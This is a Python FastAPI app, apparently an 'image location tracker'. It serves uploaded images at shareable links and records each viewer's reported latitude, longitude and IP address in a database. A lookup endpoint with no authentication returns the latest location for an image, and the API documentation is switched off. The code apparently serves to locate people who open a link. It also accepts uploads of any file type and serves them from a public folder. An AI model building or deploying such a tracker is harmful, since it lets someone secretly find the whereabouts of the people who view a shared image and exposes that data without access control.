from fastapi import FastAPI, Request, HTTPException, File, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pathlib import Path
import sqlite3
import json
import time
import shutil
import uuid

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "locations.db"
IMAGE_FOLDER = Path("static/images")

app = FastAPI(
    title="Image Location Tracker API",
    docs_url=None,        # disables Swagger UI (/docs)
    redoc_url=None,       # disables ReDoc UI (/redoc)
    openapi_url=None      # disables OpenAPI JSON (/openapi.json)
)
# Mount static folder for images/css/js
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="static")


# -------------------- DB INIT --------------------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            image_id TEXT NOT NULL,
            lat REAL,
            lon REAL,
            accuracy REAL,
            received_at TEXT,
            remote_addr TEXT
        )
    """)
    conn.commit()
    conn.close()

@app.on_event("startup")
def on_startup():
    IMAGE_FOLDER.mkdir(parents=True, exist_ok=True)
    init_db()


# -------------------- UPLOAD IMAGE --------------------
@app.post("/upload")
async def upload_image(file: UploadFile = File(...)):
    file_ext = Path(file.filename).suffix
    unique_name = f"{uuid.uuid4().hex}{file_ext}"
    save_path = IMAGE_FOLDER / unique_name

    with open(save_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {"ok": True, "image_id": unique_name}


# -------------------- REPORT LOCATION --------------------
@app.post("/report")
async def report_location(request: Request):
    try:
        payload = await request.json()
    except:
        payload = {}

    image_id = payload.get("image")
    lat = payload.get("lat")
    lon = payload.get("lon")
    if image_id and "." in image_id:
        image_id = image_id.split(".")[0]
    accuracy = payload.get("accuracy")
    received_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    remote_addr = request.client.host if request.client else "unknown"

    if not image_id:
        return JSONResponse(content={"error": "Missing image id"}, status_code=400)

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        INSERT INTO locations (image_id, lat, lon, accuracy, received_at, remote_addr)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (image_id, lat, lon, accuracy, received_at, remote_addr))
    conn.commit()
    conn.close()

    return {"ok": True}


# -------------------- GET LAST LOCATION FOR IMAGE --------------------
@app.get("/logs/last/{image_id}")
async def get_last_location(image_id: str):
    image_id = image_id.split(".")[0]
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("""
        SELECT * FROM locations
        WHERE image_id = ?
        ORDER BY id DESC
        LIMIT 1
    """, (image_id,))
    row = c.fetchone()
    conn.close()

    if not row:
        return JSONResponse(content={"error": "No location found for this image"}, status_code=404)

    return {
        "id": row["id"],
        "image_id": row["image_id"],
        "lat": row["lat"],
        "lon": row["lon"],
        "accuracy": row["accuracy"],
        "received_at": row["received_at"],
        "remote_addr": row["remote_addr"]
    }


# -------------------- FRONTEND --------------------
@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.get("/i/{image_id}", response_class=HTMLResponse)
async def image_tracker(request: Request, image_id: str):
    image_path = IMAGE_FOLDER / image_id
    if not image_path.is_file():
        raise HTTPException(status_code=404, detail="Image not found")
    return templates.TemplateResponse(
        "view.html",
        {"request": request, "img_url": f"/static/images/{image_id}", "image_id": image_id},
    )
